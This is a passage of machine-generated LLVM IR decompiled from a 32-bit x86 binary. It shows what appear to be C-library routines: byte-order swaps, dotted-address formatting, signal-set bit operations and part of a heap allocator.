  %v0_804f993 = phi i32 [ %v3_804f93f, %dec_label_pc_804f928 ], [ %v0_804f993.pre, %dec_label_pc_804f94d ]
  store i32 %v0_804f993, i32* %eax.global-to-local, align 4
  %v2_804f995 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f995, i32* @ebx, align 4
  store i32 %v0_804f928, i32* @esi, align 4
  ret i32 %v0_804f993

; uselistorder directives
  uselistorder i32 %v0_804f993, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 4, 5 }
  uselistorder label %dec_label_pc_804f990, { 1, 0 }
}

define i32 @function_804f998(i16 %arg1) local_unnamed_addr {
dec_label_pc_804f998:
  %v3_804f99d = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_804f99d = zext i16 %v3_804f99d to i32
  ret i32 %v4_804f99d
}

define i32 @function_804f9a5(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f9a5:
  %v1_804f9a9 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804f9a9
}

define i32 @function_804f9b9(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f9b9:
  %v1_804f9bd = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804f9bd
}

define i32 @function_804f9c0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f9d8.lr.ph:
  %ecx.global-to-local = alloca i32, align 4
  store i32 0, i32* @edi, align 4
  store i32 0, i32* @esi, align 4
  %v1_804f9cf = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_804f9cf, 16777216
  %v1_804f9d1 = sdiv i32 %sext, 16777216
  store i32 %v1_804f9d1, i32* @ebx, align 4
  %v1_804f9d3 = add i32 %arg2, 15
  store i32 %v1_804f9d3, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f9d8

dec_label_pc_804f9d8:                             ; preds = %dec_label_pc_804f9fd, %dec_label_pc_804f9d8.lr.ph
  %v0_804f9ea = phi i32 [ %v1_804f9d3, %dec_label_pc_804f9d8.lr.ph ], [ %v0_804fa01, %dec_label_pc_804f9fd ]
  %v0_804f9df = phi i32 [ %v1_804f9d1, %dec_label_pc_804f9d8.lr.ph ], [ %v2_804f9fd, %dec_label_pc_804f9fd ]
  %v1_804f9e3 = urem i32 %v0_804f9df, 256
  %v5_804f9eb = inttoptr i32 %v0_804f9ea to i8*
  %v6_804f9eb = call i32 @function_8051c54(i8* %v5_804f9eb, i32 %v1_804f9e3, i32 0, i32 -10, i32 0)
  %v0_804f9f3 = load i32, i32* @esi, align 4
  %v1_804f9f3 = icmp eq i32 %v0_804f9f3, 0
  %v1_804f9f5 = add i32 %v6_804f9eb, -1
  store i32 %v1_804f9f5, i32* %ecx.global-to-local, align 4
  br i1 %v1_804f9f3, label %dec_label_pc_804f9fd, label %dec_label_pc_804f9fa

dec_label_pc_804f9fa:                             ; preds = %dec_label_pc_804f9d8
  %v1_804f9fa = inttoptr i32 %v0_804f9f3 to i8*
  store i8 46, i8* %v1_804f9fa, align 1
  %v0_804fa01.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f9fd

dec_label_pc_804f9fd:                             ; preds = %dec_label_pc_804f9d8, %dec_label_pc_804f9fa
  %v0_804fa01 = phi i32 [ %v1_804f9f5, %dec_label_pc_804f9d8 ], [ %v0_804fa01.pre, %dec_label_pc_804f9fa ]
  %v0_804f9fd = load i32, i32* @ebx, align 4
  %v2_804f9fd = udiv i32 %v0_804f9fd, 256
  store i32 %v2_804f9fd, i32* @ebx, align 4
  %v0_804fa00 = load i32, i32* @edi, align 4
  %v1_804fa00 = add i32 %v0_804fa00, 1
  store i32 %v1_804fa00, i32* @edi, align 4
  store i32 %v0_804fa01, i32* @esi, align 4
  %v7_804fa06 = icmp sgt i32 %v1_804fa00, 3
  br i1 %v7_804fa06, label %dec_label_pc_804fa08, label %dec_label_pc_804f9d8

dec_label_pc_804fa08:                             ; preds = %dec_label_pc_804f9fd
  %v1_804fa09 = add i32 %v0_804fa01, 1
  ret i32 %v1_804fa09

; uselistorder directives
  uselistorder i32 %v0_804fa01, { 0, 2, 1 }
  uselistorder i32 %v1_804f9d1, { 1, 0 }
  uselistorder i32 -10, { 1, 0 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8 }
  uselistorder label %dec_label_pc_804f9fd, { 1, 0 }
}

define i32 @function_804fa0f(i32 %arg1) local_unnamed_addr {
dec_label_pc_804fa0f:
  %v2_804fa1b = call i32 @function_804f9c0(i32 %arg1, i32 ptrtoint (i32* @global_var_805b944.54 to i32))
  ret i32 %v2_804fa1b
}

define i32 @function_804fa24(i32 %arg1) local_unnamed_addr {
dec_label_pc_804fa24:
  %stack_var_-4 = alloca i32, align 4
  %v2_804fa27 = ptrtoint i32* %stack_var_-4 to i32
  %v2_804fa30 = inttoptr i32 %arg1 to i8*
  %v3_804fa30 = call i32 @function_805244c(i8* %v2_804fa30, i32 %v2_804fa27)
  %v1_804fa3b = icmp eq i32 %v3_804fa30, 0
  br i1 %v1_804fa3b, label %dec_label_pc_804fa43, label %dec_label_pc_804fa3f

dec_label_pc_804fa3f:                             ; preds = %dec_label_pc_804fa24
  %v3_804fa3f = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804fa43

dec_label_pc_804fa43:                             ; preds = %dec_label_pc_804fa24, %dec_label_pc_804fa3f
  %v0_804fa43 = phi i32 [ -1, %dec_label_pc_804fa24 ], [ %v3_804fa3f, %dec_label_pc_804fa3f ]
  ret i32 %v0_804fa43

; uselistorder directives
  uselistorder label %dec_label_pc_804fa43, { 1, 0 }
}

define i32 @function_804fa4c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fa4c:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804fa67 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804fa6e = call i32 @function_8051634(i32 3, i32 %v2_804fa67)
  ret i32 %v2_804fa6e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804faa4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804faa4:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804facf = ptrtoint i32* %stack_var_-20 to i32
  %v2_804fad6 = call i32 @function_8051634(i32 15, i32 %v2_804facf)
  ret i32 %v2_804fad6

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_804fae0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fae0:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804fb03 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804fb0a = call i32 @function_8051634(i32 10, i32 %v2_804fb03)
  ret i32 %v2_804fb0a

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_804fb14(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fb14:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804fb37 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804fb3e = call i32 @function_8051634(i32 9, i32 %v2_804fb37)
  ret i32 %v2_804fb3e

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_804fbc8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fbc8:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804fbe3 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804fbea = call i32 @function_8051634(i32 1, i32 %v2_804fbe3)
  ret i32 %v2_804fbea

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8051634, { 4, 0, 1, 3, 2 }
}

define i32 @function_804fbf4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804fbf4:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_804fc0c, label %dec_label_pc_804fbff

dec_label_pc_804fbff:                             ; preds = %dec_label_pc_804fbf4
  %v1_804fbff = add i32 %arg1, -64
  %v3_804fbff = sub i32 63, %arg1
  %v4_804fbff = and i32 %v3_804fbff, %arg1
  %v5_804fbff = icmp slt i32 %v4_804fbff, 0
  %v6_804fbff = icmp eq i32 %v1_804fbff, 0
  %v7_804fbff = icmp slt i32 %v1_804fbff, 0
  %v3_804fc02 = icmp eq i1 %v7_804fbff, %v5_804fbff
  %v4_804fc02 = icmp eq i1 %v6_804fbff, false
  %v5_804fc02 = and i1 %v4_804fc02, %v3_804fc02
  br i1 %v5_804fc02, label %dec_label_pc_804fc0c, label %dec_label_pc_804fc04

dec_label_pc_804fc04:                             ; preds = %dec_label_pc_804fbff
  %v4_804fc07 = call i32 @function_804fd10(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_804fc0c

dec_label_pc_804fc0c:                             ; preds = %dec_label_pc_804fbff, %dec_label_pc_804fbf4, %dec_label_pc_804fc04
  %v1_804fc0c = call i32 @function_804e694(i32 ptrtoint (i32* @0 to i32))
  %v1_804fc11 = inttoptr i32 %v1_804fc0c to i32*
  store i32 22, i32* %v1_804fc11, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_804fbff, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804fc0c, { 2, 0, 1 }
}

define i32 @function_804fc20(i32 %arg1) local_unnamed_addr {
dec_label_pc_804fc20:
  %v3_804fc2e = inttoptr i32 %arg1 to i8*
  %v4_804fc2e = call i32 @function_804f698(i8* %v3_804fc2e, i32 0, i32 128)
  ret i32 0
}

define i32 @function_804fd10(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fd10:
  %stack_var_-4 = alloca i32, align 4
  %v0_804fd10 = load i32, i32* @ebx, align 4
  store i32 %v0_804fd10, i32* %stack_var_-4, align 4
  %v1_804fd1e = add i32 %arg2, -1
  %v1_804fd21 = urem i32 %v1_804fd1e, 32
  %v2_804fd21 = icmp eq i32 %v1_804fd21, 0
  store i32 %v1_804fd21, i32* @ecx, align 4
  br i1 %v2_804fd21, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_804fd10
  %v5_804fd24 = shl i32 1, %v1_804fd21
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_804fd10, %bb
  %v6_804fd29 = phi i32 [ 1, %dec_label_pc_804fd10 ], [ %v5_804fd24, %bb ]
  %v2_804fd26 = udiv i32 %v1_804fd1e, 32
  store i32 %v2_804fd26, i32* @edx, align 4
  %v2_804fd29 = mul nuw nsw i32 %v2_804fd26, 4
  %v3_804fd29 = add i32 %v2_804fd29, %arg1
  %v4_804fd29 = inttoptr i32 %v3_804fd29 to i32*
  %v5_804fd29 = load i32, i32* %v4_804fd29, align 4
  %v7_804fd29 = or i32 %v5_804fd29, %v6_804fd29
  store i32 %v7_804fd29, i32* %v4_804fd29, align 4
  %v2_804fd2e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fd2e, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_804fd26, { 1, 0 }
  uselistorder i32 %v1_804fd21, { 2, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_804fd30(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804fd30:
  %v1_804fd3e = add i32 %arg2, -1
  %v1_804fd41 = urem i32 %v1_804fd3e, 32
  %v2_804fd41 = icmp eq i32 %v1_804fd41, 0
  br i1 %v2_804fd41, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_804fd30
  %v4_804fd44 = shl i32 -2, %v1_804fd41
  %v5_804fd44 = sub nsw i32 32, %v1_804fd41
  %v6_804fd44 = lshr i32 -2, %v5_804fd44
  %v7_804fd44 = or i32 %v6_804fd44, %v4_804fd44
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_804fd30, %bb
  %v6_804fd49 = phi i32 [ -2, %dec_label_pc_804fd30 ], [ %v7_804fd44, %bb ]
  %v2_804fd46 = udiv i32 %v1_804fd3e, 32
  %v2_804fd49 = mul nuw nsw i32 %v2_804fd46, 4
  %v3_804fd49 = add i32 %v2_804fd49, %arg1
  %v4_804fd49 = inttoptr i32 %v3_804fd49 to i32*
  %v5_804fd49 = load i32, i32* %v4_804fd49, align 4
  %v7_804fd49 = and i32 %v5_804fd49, %v6_804fd49
  store i32 %v7_804fd49, i32* %v4_804fd49, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804fd41, { 1, 2, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_804fd50() local_unnamed_addr {
dec_label_pc_804fd50:
  %v0_804fd50 = load i32, i32* @eax, align 4
  %v6_804fd63 = icmp ugt i32 %v0_804fd50, 16777215
  br i1 %v6_804fd63, label %dec_label_pc_804fd74, label %dec_label_pc_804fd65

dec_label_pc_804fd65:                             ; preds = %dec_label_pc_804fd50
  %tmp = icmp ult i32 %v0_804fd50, 256
  %v2_804fd52 = udiv i32 %v0_804fd50, 256
  %v2_804fd65 = call i32 @llvm.ctlz.i32(i32 %v2_804fd52, i1 true)
  %v3_804fd65 = xor i32 %v2_804fd65, 31
  %v5_804fd65 = select i1 %tmp, i32 95, i32 %v3_804fd65
  %v1_804fd68 = add nuw nsw i32 %v5_804fd65, 6
  %v2_804fd6b = urem i32 %v1_804fd68, 32
  %v4_804fd6b = icmp eq i32 %v2_804fd6b, 0
  br i1 %v4_804fd6b, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_804fd65
  %v5_804fd6b = lshr i32 %v0_804fd50, %v2_804fd6b
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_804fd65, %bb
  %v0_804fd6d = phi i32 [ %v0_804fd50, %dec_label_pc_804fd65 ], [ %v5_804fd6b, %bb ]
  %v1_804fd6d = urem i32 %v0_804fd6d, 4
  %v2_804fd70 = mul nuw nsw i32 %v5_804fd65, 4
  %v3_804fd70 = or i32 %v1_804fd6d, 32
  %v4_804fd70 = add nuw nsw i32 %v3_804fd70, %v2_804fd70
  br label %dec_label_pc_804fd74

dec_label_pc_804fd74:                             ; preds = %dec_label_pc_804fd50, %bb4
  %v0_804fd75 = phi i32 [ 95, %dec_label_pc_804fd50 ], [ %v4_804fd70, %bb4 ]
  ret i32 %v0_804fd75

; uselistorder directives
  uselistorder i32 %v2_804fd6b, { 1, 0 }
  uselistorder i32 %v0_804fd50, { 2, 3, 1, 0, 4 }
  uselistorder i1 true, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fd74, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_804fd76(i32 %arg1) local_unnamed_addr {
dec_label_pc_804fd76:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804fd76 = load i32, i32* @ebp, align 4
  %v0_804fd77 = load i32, i32* @edi, align 4
  %v0_804fd78 = load i32, i32* @esi, align 4
  %v0_804fd79 = load i32, i32* @ebx, align 4
  store i32 %v0_804fd79, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804fd8b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804fd8b, i32* @eax, align 4
  store i32 %v2_804fd8b, i32* %stack_var_-92, align 4
  %v2_804fd90 = call i32 @function_80512e2(i32 %v2_804fd8b, i32 134550239)
  store i32 %v2_804fd90, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80557d0.55 to i32), i32* %stack_var_-92, align 4
  %v1_804fd9c = call i32 @function_80512df(i32 ptrtoint (i32* @global_var_80557d0.55 to i32))
  store i32 %v1_804fd9c, i32* %eax.global-to-local, align 4
  %v0_804fda4 = load i32, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v0_804fda4, -32
  br i1 %tmp, label %dec_label_pc_804fdbb, label %dec_label_pc_804fda9

dec_label_pc_804fda9:                             ; preds = %dec_label_pc_804fd76
  %v0_804fda9 = load i32, i32* %stack_var_-92, align 4
  %v1_804fda9 = call i32 @function_804e694(i32 %v0_804fda9)
  store i32 %v1_804fda9, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804fdb0 = inttoptr i32 %v1_804fda9 to i32*
  store i32 12, i32* %v1_804fdb0, align 4
  br label %dec_label_pc_805050e

dec_label_pc_804fdbb:                             ; preds = %dec_label_pc_804fd76
  %v1_804fdbb = add i32 %v0_804fda4, 11
  %tmp126 = icmp ult i32 %v1_804fdbb, 16
  br i1 %tmp126, label %dec_label_pc_804fdd2, label %dec_label_pc_804fdcb

dec_label_pc_804fdcb:                             ; preds = %dec_label_pc_804fdbb
  %v1_804fdcb = and i32 %v1_804fdbb, -8
  br label %dec_label_pc_804fdd2

dec_label_pc_804fdd2:                             ; preds = %dec_label_pc_804fdbb, %dec_label_pc_804fdcb
  %storemerge129 = phi i32 [ %v1_804fdcb, %dec_label_pc_804fdcb ], [ %v1_804fdbb, %dec_label_pc_804fdbb ]
  %v1_8050172 = phi i32 [ %v1_804fdcb, %dec_label_pc_804fdcb ], [ 16, %dec_label_pc_804fdbb ]
  store i32 %storemerge129, i32* %eax.global-to-local, align 4
  %v0_804fdd2 = load i8, i8* @global_var_805ba20.56, align 1
  %v1_804fdd2 = sext i8 %v0_804fdd2 to i32
  store i32 %v1_804fdd2, i32* @ebx, align 4
  %v3_804fdd8 = urem i8 %v0_804fdd2, 2
  %v4_804fdd8 = icmp eq i8 %v3_804fdd8, 0
  %v1_804fddb = icmp eq i1 %v4_804fdd8, false
  br i1 %v1_804fddb, label %dec_label_pc_804fdfa, label %dec_label_pc_804fddd

dec_label_pc_804fddd:                             ; preds = %dec_label_pc_804fdd2
  %v2_804fddd = icmp eq i8 %v0_804fdd2, 0
  %v1_804fddf = icmp eq i1 %v2_804fddd, false
  br i1 %v1_804fddf, label %dec_label_pc_80500dd, label %dec_label_pc_804fde5

dec_label_pc_804fde5:                             ; preds = %dec_label_pc_804fddd
  store i32 ptrtoint (i8* @global_var_805ba20.56 to i32), i32* %stack_var_-92, align 4
  %v2_804fded = call i32 @function_80505a5(i32* bitcast (i8* @global_var_805ba20.56 to i32*))
  store i32 %v2_804fded, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80500dd

dec_label_pc_804fdfa:                             ; preds = %dec_label_pc_804fdd2
  %v11_804fdfa = trunc i32 %v1_8050172 to i8
  %v8_804fdfe = icmp ugt i8 %v11_804fdfa, %v0_804fdd2
  br i1 %v8_804fdfe, label %dec_label_pc_804fe1b, label %dec_label_pc_804fe00

dec_label_pc_804fe00:                             ; preds = %dec_label_pc_804fdfa
  %v2_804fe04 = udiv i32 %v1_8050172, 2
  store i32 %v2_804fe04, i32* %eax.global-to-local, align 4
  %v1_804fe06 = add i32 %v2_804fe04, ptrtoint (i8* @global_var_805ba20.56 to i32)
  store i32 %v1_804fe06, i32* %ecx.global-to-local, align 4
  %v1_804fe0c = add i32 %v2_804fe04, add (i32 ptrtoint (i8* @global_var_805ba20.56 to i32), i32 -4)
  %v2_804fe0c = inttoptr i32 %v1_804fe0c to i32*
  %v3_804fe0c = load i32, i32* %v2_804fe0c, align 4
  store i32 %v3_804fe0c, i32* %edx.global-to-local, align 4
  %v1_804fe0f = icmp eq i32 %v3_804fe0c, 0
  br i1 %v1_804fe0f, label %dec_label_pc_804fe1b, label %dec_label_pc_804fe13

dec_label_pc_804fe13:                             ; preds = %dec_label_pc_804fe00
  %v1_804fe13 = add i32 %v3_804fe0c, 8
  %v2_804fe13 = inttoptr i32 %v1_804fe13 to i32*
  %v3_804fe13 = load i32, i32* %v2_804fe13, align 4
  store i32 %v3_804fe13, i32* %eax.global-to-local, align 4
  store i32 %v3_804fe13, i32* %v2_804fe0c, align 4
  br label %dec_label_pc_804fe54

dec_label_pc_804fe1b:                             ; preds = %dec_label_pc_804fe00, %dec_label_pc_804fdfa
  %v8_804fe1b = icmp ult i32 %v1_8050172, 255
  %v6_804fe23 = icmp ugt i32 %v1_8050172, 255
  store i32 %v1_8050172, i32* @eax, align 4
  br i1 %v6_804fe23, label %dec_label_pc_804fe5c, label %dec_label_pc_804fe25

dec_label_pc_804fe25:                             ; preds = %dec_label_pc_804fe1b
  %v2_804fe29 = udiv i32 %v1_8050172, 8
  store i32 %v2_804fe29, i32* %eax.global-to-local, align 4
  %v1_804fe2c = mul nuw i32 %v2_804fe29, 8
  %v2_804fe2c = add i32 %v1_804fe2c, ptrtoint (i32* @global_var_805ba4c.57 to i32)
  store i32 %v2_804fe2c, i32* %ecx.global-to-local, align 4
  %v1_804fe37 = add i32 %v1_804fe2c, add (i32 ptrtoint (i32* @global_var_805ba4c.57 to i32), i32 12)
  %v2_804fe37 = inttoptr i32 %v1_804fe37 to i32*
  %v3_804fe37 = load i32, i32* %v2_804fe37, align 4
  store i32 %v3_804fe37, i32* %edx.global-to-local, align 4
  %v12_804fe3a = icmp eq i32 %v3_804fe37, %v2_804fe2c
  br i1 %v12_804fe3a, label %dec_label_pc_804ff58.preheader, label %dec_label_pc_804fe42

dec_label_pc_804fe42:                             ; preds = %dec_label_pc_804fe25
  store i32 %v1_8050172, i32* %ebx.global-to-local, align 4
  %v1_804fe46 = add i32 %v3_804fe37, 12
  %v2_804fe46 = inttoptr i32 %v1_804fe46 to i32*
  %v3_804fe46 = load i32, i32* %v2_804fe46, align 4
  store i32 %v3_804fe46, i32* %eax.global-to-local, align 4
  %v2_804fe49 = or i32 %v1_8050172, 4
  %v3_804fe49 = add i32 %v3_804fe37, %v2_804fe49
  %v4_804fe49 = inttoptr i32 %v3_804fe49 to i32*
  %v5_804fe49 = load i32, i32* %v4_804fe49, align 4
  %v6_804fe49 = or i32 %v5_804fe49, 1
  store i32 %v6_804fe49, i32* %v4_804fe49, align 4
  %v0_804fe4e = load i32, i32* %eax.global-to-local, align 4
  %v1_804fe4e = load i32, i32* %ecx.global-to-local, align 4
  %v2_804fe4e = add i32 %v1_804fe4e, 12
  %v3_804fe4e = inttoptr i32 %v2_804fe4e to i32*
  store i32 %v0_804fe4e, i32* %v3_804fe4e, align 4
  %v0_804fe51 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804fe51 = load i32, i32* %eax.global-to-local, align 4
  %v2_804fe51 = add i32 %v1_804fe51, 8
  %v3_804fe51 = inttoptr i32 %v2_804fe51 to i32*
  store i32 %v0_804fe51, i32* %v3_804fe51, align 4
  br label %dec_label_pc_804fe54

dec_label_pc_804fe54:                             ; preds = %dec_label_pc_804fe13, %dec_label_pc_804fe42
  %v0_804fe54 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fe54 = add i32 %v0_804fe54, 8
  store i32 %v1_804fe54, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80504fd

dec_label_pc_804fe5c:                             ; preds = %dec_label_pc_804fe1b
  %v0_804fe60 = call i32 @function_804fd50()
  store i32 %v0_804fe60, i32* %eax.global-to-local, align 4
  %v3_804fe65 = and i8 %v0_804fdd2, 2
  %v4_804fe65 = icmp eq i8 %v3_804fe65, 0
  br i1 %v4_804fe65, label %dec_label_pc_804ff58.preheader, label %dec_label_pc_804fe72

dec_label_pc_804fe72:                             ; preds = %dec_label_pc_804fe5c
  store i32 ptrtoint (i8* @global_var_805ba20.56 to i32), i32* %stack_var_-92, align 4
  %v2_804fe7a = call i32 @function_80505a5(i32* bitcast (i8* @global_var_805ba20.56 to i32*))
  store i32 %v2_804fe7a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ff58.preheader

dec_label_pc_804ff58.preheader:                   ; preds = %dec_label_pc_804fe72, %dec_label_pc_804fe25, %dec_label_pc_804fe5c
  %stack_var_-40.0.ph = phi i32 [ %v2_804fe29, %dec_label_pc_804fe25 ], [ %v0_804fe60, %dec_label_pc_804fe72 ], [ %v0_804fe60, %dec_label_pc_804fe5c ]
  %v0_804ff589 = load i32, i32* @global_var_805ba60.60, align 32
  store i32 %v0_804ff589, i32* @ebp, align 4
  %v9_804ff5e15 = icmp eq i32 %v0_804ff589, 134593108
  %v1_804ff6417 = icmp eq i1 %v9_804ff5e15, false
  br i1 %v1_804ff6417, label %dec_label_pc_804fe87.lr.ph, label %dec_label_pc_804ff6a

dec_label_pc_804fe87.lr.ph:                       ; preds = %dec_label_pc_804ff58.preheader
  %v1_804feae = add i32 %v1_8050172, 16
  br label %dec_label_pc_804fe87

dec_label_pc_804fe87:                             ; preds = %dec_label_pc_804fe87.lr.ph, %dec_label_pc_804ff58
  %v1_80504af = phi i32 [ %v0_804ff589, %dec_label_pc_804fe87.lr.ph ], [ %v0_804ff58, %dec_label_pc_804ff58 ]
  %v1_804fe87 = add i32 %v1_80504af, 4
  %v2_804fe87 = inttoptr i32 %v1_804fe87 to i32*
  %v3_804fe87 = load i32, i32* %v2_804fe87, align 4
  %v1_804fe8a = add i32 %v1_80504af, 12
  %v2_804fe8a = inttoptr i32 %v1_804fe8a to i32*
  %v3_804fe8a = load i32, i32* %v2_804fe8a, align 4
  store i32 %v3_804fe8a, i32* %edx.global-to-local, align 4
  %v1_804fe8d = and i32 %v3_804fe87, -4
  store i32 %v1_804fe8d, i32* @edi, align 4
  br i1 %v6_804fe23, label %dec_label_pc_804feb9, label %dec_label_pc_804fe9a

dec_label_pc_804fe9a:                             ; preds = %dec_label_pc_804fe87
  %v9_804fe9a = icmp eq i32 %v3_804fe8a, 134593108
  %v1_804fea0 = icmp eq i1 %v9_804fe9a, false
  br i1 %v1_804fea0, label %dec_label_pc_804feb9, label %dec_label_pc_804fea2

dec_label_pc_804fea2:                             ; preds = %dec_label_pc_804fe9a
  %v1_804fea2 = load i32, i32* @global_var_805ba50.58, align 16
  %v12_804fea2 = icmp eq i32 %v1_80504af, %v1_804fea2
  %v1_804fea8 = icmp eq i1 %v12_804fea2, false
  br i1 %v1_804fea8, label %dec_label_pc_804feb9, label %dec_label_pc_804feaa

dec_label_pc_804feaa:                             ; preds = %dec_label_pc_804fea2
  store i32 %v1_804feae, i32* %eax.global-to-local, align 4
  %v6_804feb3 = icmp ugt i32 %v1_804fe8d, %v1_804feae
  br i1 %v6_804feb3, label %dec_label_pc_8050498, label %dec_label_pc_804feb9

dec_label_pc_804feb9:                             ; preds = %dec_label_pc_804feaa, %dec_label_pc_804fea2, %dec_label_pc_804fe9a, %dec_label_pc_804fe87
  store i32 ptrtoint (i32* @global_var_805ba54.59 to i32), i32* %eax.global-to-local, align 4
  store i32 %v3_804fe8a, i32* @global_var_805ba60.60, align 4
  %v2_804fec1 = add i32 %v3_804fe8a, 8
  %v3_804fec1 = inttoptr i32 %v2_804fec1 to i32*
  store i32 ptrtoint (i32* @global_var_805ba54.59 to i32), i32* %v3_804fec1, align 4
  %v0_804fec4 = load i32, i32* @edi, align 4
  %v15_804fec4 = icmp eq i32 %v0_804fec4, %v1_8050172
  br i1 %v15_804fec4, label %dec_label_pc_80504d9, label %dec_label_pc_804fece

dec_label_pc_804fece:                             ; preds = %dec_label_pc_804feb9
  %v6_804fed4 = icmp ugt i32 %v0_804fec4, 255
  br i1 %v6_804fed4, label %dec_label_pc_804fee7, label %dec_label_pc_804fed6

dec_label_pc_804fed6:                             ; preds = %dec_label_pc_804fece
  %v2_804fed8 = udiv i32 %v0_804fec4, 8
  store i32 %v2_804fed8, i32* %esi.global-to-local, align 4
  %v1_804fedb = mul nuw i32 %v2_804fed8, 8
  %v2_804fedb = add i32 %v1_804fedb, 134593100
  store i32 %v2_804fedb, i32* @ebx, align 4
  %v1_804fee2 = add i32 %v1_804fedb, 134593108
  %v2_804fee2 = inttoptr i32 %v1_804fee2 to i32*
  %v3_804fee2 = load i32, i32* %v2_804fee2, align 4
  store i32 %v3_804fee2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ff30

dec_label_pc_804fee7:                             ; preds = %dec_label_pc_804fece
  store i32 %v0_804fec4, i32* @eax, align 4
  %v0_804fee9 = call i32 @function_804fd50()
  store i32 %v0_804fee9, i32* %esi.global-to-local, align 4
  %v1_804fef0 = mul i32 %v0_804fee9, 8
  %v2_804fef0 = add i32 %v1_804fef0, ptrtoint (i32* @global_var_805ba4c.57 to i32)
  store i32 %v2_804fef0, i32* %eax.global-to-local, align 4
  %v1_804fef7 = add i32 %v1_804fef0, add (i32 ptrtoint (i32* @global_var_805ba4c.57 to i32), i32 8)
  %v2_804fef7 = inttoptr i32 %v1_804fef7 to i32*
  %v3_804fef7 = load i32, i32* %v2_804fef7, align 4
  store i32 %v3_804fef7, i32* %edx.global-to-local, align 4
  %v12_804fefa = icmp eq i32 %v3_804fef7, %v2_804fef0
  store i32 %v3_804fef7, i32* @ebx, align 4
  br i1 %v12_804fefa, label %dec_label_pc_804ff30, label %dec_label_pc_804ff04

